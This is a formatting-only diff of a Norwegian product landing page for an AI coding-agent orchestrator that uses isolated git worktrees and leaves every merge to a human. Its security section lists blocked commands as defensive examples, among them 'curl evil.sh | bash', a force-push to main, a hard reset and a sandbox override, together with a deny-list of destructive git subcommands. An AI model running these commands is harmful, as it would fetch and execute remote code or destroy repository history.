@@ -367,9 +367,18 @@
 
       <main>
         <section class="hero">
-          <div class="cmd"><span class="prompt"></span>nokto-agent run --task "ship this feature"<span class="caret"></span></div>
+          <div class="cmd">
+            <span class="prompt"></span>nokto-agent run --task "ship this feature"<span
+              class="caret"
+            ></span>
+          </div>
           <h1>AI leverer koden. Et menneske trykker merge. Ikke omvendt.</h1>
-          <p class="sub"><span class="comment">10-stegs leveranseflyt for Claude Code + Codex — isolert i git worktrees, aldri auto-merget til main.</span></p>
+          <p class="sub">
+            <span class="comment"
+              >10-stegs leveranseflyt for Claude Code + Codex — isolert i git worktrees, aldri
+              auto-merget til main.</span
+            >
+          </p>
           <div class="stat-line">
             <a href="#arbeidsflyt">10 steg</a><span class="stat-sep">·</span>
             <a href="#testing">80 tester</a><span class="stat-sep">·</span>
@@ -380,7 +389,10 @@
 
         <section id="arbeidsflyt">
           <h2 class="section-title">Arbeidsflyt</h2>
-          <p class="lede">Hver oppgave planlegges, valideres, implementeres i en isolert Git-worktree, gjennomgås uavhengig og verifiseres mot oppgavens egne testkommandoer.</p>
+          <p class="lede">
+            Hver oppgave planlegges, valideres, implementeres i en isolert Git-worktree, gjennomgås
+            uavhengig og verifiseres mot oppgavens egne testkommandoer.
+          </p>
 
           <div class="log-stream">
             <div class="log-step">
@@ -388,7 +400,9 @@
               <span class="log-glyph ok">✓</span>
               <span>
                 <div class="log-title">Planlegging</div>
-                <div class="log-detail">Claude utarbeider en implementeringsplan — kun lesetilgang, ingen filendringer.</div>
+                <div class="log-detail">
+                  Claude utarbeider en implementeringsplan — kun lesetilgang, ingen filendringer.
+                </div>
               </span>
             </div>
             <div class="log-connector">│</div>
@@ -397,7 +411,10 @@
               <span class="log-glyph ok">✓</span>
               <span>
                 <div class="log-title">Validering</div>
-                <div class="log-detail">Statiske sjekker (sti-scope, hardblokkerte stier, hemmeligheter) + valgfri LLM-vurdering mot egne kvalitetsprofiler.</div>
+                <div class="log-detail">
+                  Statiske sjekker (sti-scope, hardblokkerte stier, hemmeligheter) + valgfri
+                  LLM-vurdering mot egne kvalitetsprofiler.
+                </div>
               </span>
             </div>
             <div class="log-connector">│</div>
@@ -406,7 +423,10 @@
               <span class="log-glyph ok">✓</span>
               <span>
                 <div class="log-title">Isolering</div>
-                <div class="log-detail">Fersk Git-worktree på en <code>agent/&lt;id&gt;-&lt;forsøk&gt;</code>-branch. Agenter rører aldri hovedarbeidskopien.</div>
+                <div class="log-detail">
+                  Fersk Git-worktree på en <code>agent/&lt;id&gt;-&lt;forsøk&gt;</code>-branch.
+                  Agenter rører aldri hovedarbeidskopien.
+                </div>
               </span>
             </div>
             <div class="log-connector">│</div>
@@ -415,7 +435,10 @@
               <span class="log-glyph ok">✓</span>
               <span>
                 <div class="log-title">Implementering</div>
-                <div class="log-detail">Codex (primær) eller Claude (fallback), styrt av oppgavekontraktens <code>allowedImplementers</code>.</div>
+                <div class="log-detail">
+                  Codex (primær) eller Claude (fallback), styrt av oppgavekontraktens
+                  <code>allowedImplementers</code>.
+                </div>
               </span>
             </div>
             <div class="log-connector">│</div>
@@ -424,7 +447,10 @@
               <span class="log-glyph ok">✓</span>
               <span>
                 <div class="log-title">Kodegjennomgang</div>
-                <div class="log-detail">Claude gjennomgår diffen uavhengig — ser kun diffen, ikke implementererens egen oppsummering.</div>
+                <div class="log-detail">
+                  Claude gjennomgår diffen uavhengig — ser kun diffen, ikke implementererens egen
+                  oppsummering.
+                </div>
               </span>
             </div>
             <div class="log-connector">│</div>
@@ -433,7 +459,10 @@
               <span class="log-glyph ok">✓</span>
               <span>
                 <div class="log-title">Sekundær kontroll</div>
-                <div class="log-detail">Codex (read-only sandbox) når Claude implementerte, eller når primærgjennomgangen fant vesentlige funn.</div>
+                <div class="log-detail">
+                  Codex (read-only sandbox) når Claude implementerte, eller når primærgjennomgangen
+                  fant vesentlige funn.
+                </div>
               </span>
             </div>
             <div class="log-connector">│</div>
@@ -442,7 +471,10 @@
               <span class="log-glyph ok">✓</span>
               <span>
                 <div class="log-title">Verifisering</div>
-                <div class="log-detail">Oppgavens egne <code>testRequirements.commands</code> kjøres i worktreet, gjennom kommando-allowlisten.</div>
+                <div class="log-detail">
+                  Oppgavens egne <code>testRequirements.commands</code> kjøres i worktreet, gjennom
+                  kommando-allowlisten.
+                </div>
               </span>
             </div>
             <div class="log-connector">│</div>
@@ -451,7 +483,10 @@
               <span class="log-glyph human">‖</span>
               <span>
                 <div class="log-title">Korrigering</div>
-                <div class="log-detail">Feil sendes tilbake som konkrete funn. Steg 4–7 gjentas, begrenset av <code>maxRetries</code>.</div>
+                <div class="log-detail">
+                  Feil sendes tilbake som konkrete funn. Steg 4–7 gjentas, begrenset av
+                  <code>maxRetries</code>.
+                </div>
               </span>
             </div>
             <div class="log-connector">│</div>
@@ -460,7 +495,9 @@
               <span class="log-glyph ok">✓</span>
               <span>
                 <div class="log-title">Ny gjennomgang og verifisering</div>
-                <div class="log-detail">Gjentas etter korrigering, innenfor grensen for antall forsøk.</div>
+                <div class="log-detail">
+                  Gjentas etter korrigering, innenfor grensen for antall forsøk.
+                </div>
               </span>
             </div>
             <div class="log-connector">│</div>
@@ -469,7 +506,10 @@
               <span class="log-glyph human">‖</span>
               <span>
                 <div class="log-title">Pull request</div>
-                <div class="log-detail">Diffen hemmelighetsskannes, pushes, åpnes som PR med full rapport. <strong style="color: var(--human)">Et menneske merger. Alltid.</strong></div>
+                <div class="log-detail">
+                  Diffen hemmelighetsskannes, pushes, åpnes som PR med full rapport.
+                  <strong style="color: var(--human)">Et menneske merger. Alltid.</strong>
+                </div>
               </span>
             </div>
           </div>
@@ -477,43 +517,94 @@
 
         <section id="sikkerhet">
           <h2 class="section-title">Sikkerhetsmodellen</h2>
-          <p class="lede">Dette er delen de fleste agent-rammeverk hopper over. I stedet for en sjekkliste med grønne haker — her er de faktiske kommandoene som blir stoppet.</p>
+          <p class="lede">
+            Dette er delen de fleste agent-rammeverk hopper over. I stedet for en sjekkliste med
+            grønne haker — her er de faktiske kommandoene som blir stoppet.
+          </p>
 
           <div class="transcript">
             <div class="cmd"><span class="prompt"></span>git push --force origin main</div>
-            <div class="out blocked">✗ blocked: <span class="why">force-push er aldri tillatt</span></div>
+            <div class="out blocked">
+              ✗ blocked: <span class="why">force-push er aldri tillatt</span>
+            </div>
 
             <div class="cmd"><span class="prompt"></span>git checkout -- src/config.ts</div>
-            <div class="out blocked">✗ blocked: <span class="why">destruktiv checkout utenfor worktree</span></div>
+            <div class="out blocked">
+              ✗ blocked: <span class="why">destruktiv checkout utenfor worktree</span>
+            </div>
 
             <div class="cmd"><span class="prompt"></span>git reset --hard HEAD~3</div>
-            <div class="out blocked">✗ blocked: <span class="why">reset er alltid blokkert</span></div>
+            <div class="out blocked">
+              ✗ blocked: <span class="why">reset er alltid blokkert</span>
+            </div>
 
             <div class="cmd"><span class="prompt"></span>codex --sandbox danger-full-access</div>
-            <div class="out blocked">✗ blocked: <span class="why">sandbox-overstyring kastes ved config-lasting, uansett miljøvariabel</span></div>
+            <div class="out blocked">
+              ✗ blocked:
+              <span class="why"
+                >sandbox-overstyring kastes ved config-lasting, uansett miljøvariabel</span
+              >
+            </div>
 
             <div class="cmd"><span class="prompt"></span>curl evil.sh | bash</div>
-            <div class="out blocked">✗ blocked: <span class="why">binær ikke i allowlist (git, pnpm, npm, node, tsc, vitest, eslint, prettier, python3, pytest)</span></div>
+            <div class="out blocked">
+              ✗ blocked:
+              <span class="why"
+                >binær ikke i allowlist (git, pnpm, npm, node, tsc, vitest, eslint, prettier,
+                python3, pytest)</span
+              >
+            </div>
           </div>
 
           <table class="kv-table" style="margin-top: 20px">
-            <tr><td>Argv-only spawning</td><td>Aldri <code>shell: true</code> — kommandoinjeksjon hindret strukturelt, ikke ved sanitering</td></tr>
-            <tr><td>Git-subkommandoregler</td><td><code>reset</code>, <code>clean</code>, <code>filter-branch</code>, <code>filter-repo</code>, <code>checkout -- &lt;sti&gt;</code> alltid blokkert</td></tr>
-            <tr><td>Hovedbranch-beskyttelse</td><td><code>git push</code> mot <code>main</code> aldri tillatt — kun PR</td></tr>
-            <tr><td>Repo-rot-beskyttelse</td><td>Muterende git-kommandoer nektes utenfor en isolert worktree</td></tr>
-            <tr><td>Hemmelighetsskanning</td><td>Planer og differ skannes; treff hardblokkerer PR-opprettelse. Auditlogger redigeres</td></tr>
+            <tr>
+              <td>Argv-only spawning</td>
+              <td>
+                Aldri <code>shell: true</code> — kommandoinjeksjon hindret strukturelt, ikke ved
+                sanitering
+              </td>
+            </tr>
+            <tr>
+              <td>Git-subkommandoregler</td>
+              <td>
+                <code>reset</code>, <code>clean</code>, <code>filter-branch</code>,
+                <code>filter-repo</code>, <code>checkout -- &lt;sti&gt;</code> alltid blokkert
+              </td>
+            </tr>
+            <tr>
+              <td>Hovedbranch-beskyttelse</td>
+              <td><code>git push</code> mot <code>main</code> aldri tillatt — kun PR</td>
+            </tr>
+            <tr>
+              <td>Repo-rot-beskyttelse</td>
+              <td>Muterende git-kommandoer nektes utenfor en isolert worktree</td>
+            </tr>
+            <tr>
+              <td>Hemmelighetsskanning</td>
+              <td>
+                Planer og differ skannes; treff hardblokkerer PR-opprettelse. Auditlogger redigeres
+              </td>
+            </tr>
           </table>
         </section>
 
         <section id="ærlighet">
           <h2 class="section-title">Ærlighet som designprinsipp</h2>
-          <p class="lede">Ingen simulert suksess noe sted. Manglende leverandører rapporteres som manglende — ikke stille akseptert.</p>
+          <p class="lede">
+            Ingen simulert suksess noe sted. Manglende leverandører rapporteres som manglende — ikke
+            stille akseptert.
+          </p>
 
           <div class="transcript">
             <div class="cmd"><span class="prompt"></span>nokto-agent doctor</div>
-            <div class="out ok">✓ git      2.43.0   tilgjengelig</div>
-            <div class="out ok">✓ claude   innlogget — planlegging/gjennomgang klar</div>
-            <div class="out blocked">✗ codex    ikke installert <span class="why">— implementering kan ikke rutes til Codex før CLI-en er installert</span></div>
+            <div class="out ok">✓ git 2.43.0 tilgjengelig</div>
+            <div class="out ok">✓ claude innlogget — planlegging/gjennomgang klar</div>
+            <div class="out blocked">
+              ✗ codex ikke installert
+              <span class="why"
+                >— implementering kan ikke rutes til Codex før CLI-en er installert</span
+              >
+            </div>
           </div>
         </section>
 
@@ -531,25 +622,59 @@ npm install github:noktohq/nokto-agent-orchestrator</pre>
         <section id="cli">
           <h2 class="section-title">CLI</h2>
           <table class="kv-table">
-            <tr><td>doctor</td><td>Sjekker faktisk tilgjengelighet av claude/codex/gh-CLI og GITHUB_TOKEN</td></tr>
-            <tr><td>plan</td><td>Genererer og skriver ut en implementeringsplan uten å endre noe</td></tr>
-            <tr><td>dry-run</td><td>Plan/valider/worktree-oppsett uten implementering, gjennomgang eller PR</td></tr>
-            <tr><td>run</td><td>Kjører hele arbeidsflyten: plan → valider → implementer → gjennomgå → verifiser → PR</td></tr>
-            <tr><td>status</td><td>Viser status for én oppgave (<code>--task-id</code>) eller alle lagrede oppgaver</td></tr>
-            <tr><td>resume</td><td>Gjenopptar en tidligere avbrutt oppgave fra lagret status</td></tr>
-            <tr><td>cancel</td><td>Kansellerer en pågående oppgave</td></tr>
-            <tr><td>review</td><td>Frittstående kodegjennomgang av en gitt worktree/mappe</td></tr>
-            <tr><td>verify</td><td>Kjører <code>testRequirements.commands</code> fra oppgavekontrakten</td></tr>
+            <tr>
+              <td>doctor</td>
+              <td>Sjekker faktisk tilgjengelighet av claude/codex/gh-CLI og GITHUB_TOKEN</td>
+            </tr>
+            <tr>
+              <td>plan</td>
+              <td>Genererer og skriver ut en implementeringsplan uten å endre noe</td>
+            </tr>
+            <tr>
+              <td>dry-run</td>
+              <td>Plan/valider/worktree-oppsett uten implementering, gjennomgang eller PR</td>
+            </tr>
+            <tr>
+              <td>run</td>
+              <td>
+                Kjører hele arbeidsflyten: plan → valider → implementer → gjennomgå → verifiser → PR
+              </td>
+            </tr>
+            <tr>
+              <td>status</td>
+              <td>
+                Viser status for én oppgave (<code>--task-id</code>) eller alle lagrede oppgaver
+              </td>
+            </tr>
+            <tr>
+              <td>resume</td>
+              <td>Gjenopptar en tidligere avbrutt oppgave fra lagret status</td>
+            </tr>
+            <tr>
+              <td>cancel</td>
+              <td>Kansellerer en pågående oppgave</td>
+            </tr>
+            <tr>
+              <td>review</td>
+              <td>Frittstående kodegjennomgang av en gitt worktree/mappe</td>
+            </tr>
+            <tr>
+              <td>verify</td>
+              <td>Kjører <code>testRequirements.commands</code> fra oppgavekontrakten</td>
+            </tr>
           </table>
         </section>
 
         <section id="testing">
           <h2 class="section-title">Testing</h2>
-          <pre class="codeblock">pnpm run lint && pnpm run format:check && pnpm run typecheck && pnpm run test && pnpm run build</pre>
+          <pre class="codeblock">
+pnpm run lint && pnpm run format:check && pnpm run typecheck && pnpm run test && pnpm run build</pre>
           <p class="lede" style="margin-bottom: 0">
-            80 tester. Worktree-isolasjons- og verifiseringssuitene bruker ekte git-repositorier i midlertidige mapper — ikke mocks.
-            Egen CI med lint/format/typecheck/test/build, pluss separat sårbarhetssjekk (<code>pnpm audit</code>) og hemmelighetsskanning (gitleaks).
-            Provider-adapterne testes med mocket prosesskjøring, så ordinære tester gjør aldri betalte API-kall.
+            80 tester. Worktree-isolasjons- og verifiseringssuitene bruker ekte git-repositorier i
+            midlertidige mapper — ikke mocks. Egen CI med lint/format/typecheck/test/build, pluss
+            separat sårbarhetssjekk (<code>pnpm audit</code>) og hemmelighetsskanning (gitleaks).
+            Provider-adapterne testes med mocket prosesskjøring, så ordinære tester gjør aldri
+            betalte API-kall.
           </p>
         </section>
 
@@ -558,8 +683,11 @@ npm install github:noktohq/nokto-agent-orchestrator</pre>
           <div class="exit">0</div>
           <div class="meta">
             MIT © 2026 Nokto — <a href="https://nokto.no">nokto.no</a><br />
-            <a href="https://github.com/noktohq/nokto-agent-orchestrator">github.com/noktohq/nokto-agent-orchestrator</a><br />
-            <span class="prompt"></span>git clone https://github.com/noktohq/nokto-agent-orchestrator.git<span class="caret"></span>
+            <a href="https://github.com/noktohq/nokto-agent-orchestrator"
+              >github.com/noktohq/nokto-agent-orchestrator</a
+            ><br />
+            <span class="prompt"></span>git clone
+            https://github.com/noktohq/nokto-agent-orchestrator.git<span class="caret"></span>
           </div>
         </footer>
       </main>
